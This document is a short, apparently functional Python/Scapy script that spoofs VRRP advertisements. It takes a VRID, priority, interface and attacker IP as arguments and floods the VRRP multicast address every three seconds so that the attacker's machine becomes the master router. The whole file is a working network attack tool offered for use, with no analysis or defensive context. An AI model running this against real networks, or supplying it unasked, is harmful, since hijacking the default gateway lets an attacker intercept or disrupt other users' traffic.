#!/usr/bin/env python3


from scapy.all import *
import argparse

#VRRP Multicast address
VRRPMulticast = "224.0.0.18"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("--vrid", dest="vrid", type=int, required=True, help="Choose VRRP VRID Value")
    parser.add_argument("--priority", dest="priority",type=int, required=True, help="Choose VRRP Priority Value")
    parser.add_argument("--interface", dest="interface",type=str, required=True, help="Choose your interface")
    parser.add_argument("--ip", dest="attackerip", type=str, required=True, help="Choose your IP Address")
    parser.add_argument("--vrrprouterip", dest="vrrprouterip", type=str, required=True, help="Choose VRRP Router IP Address")
    args = parser.parse_args()

    return args


def spoofing(vrid, priority, interface, attackerip, vrrprouterip):
    print ("Sending malicious VRRP Packets... You become a master VRRP Router")
    ip = IP(src=args.attackerip, dst=VRRPMulticast, ttl=255)
    vrrp = VRRP(vrid=args.vrid, priority=args.priority, addrlist=args.vrrprouterip)
    malicious_vrrp_packet = ip / vrrp
    send(malicious_vrrp_packet, iface=args.interface, inter=3, loop=1)


args = get_arguments()
spoofing(args.vrid, args.priority, args.interface, args.attackerip, args.vrrprouterip)

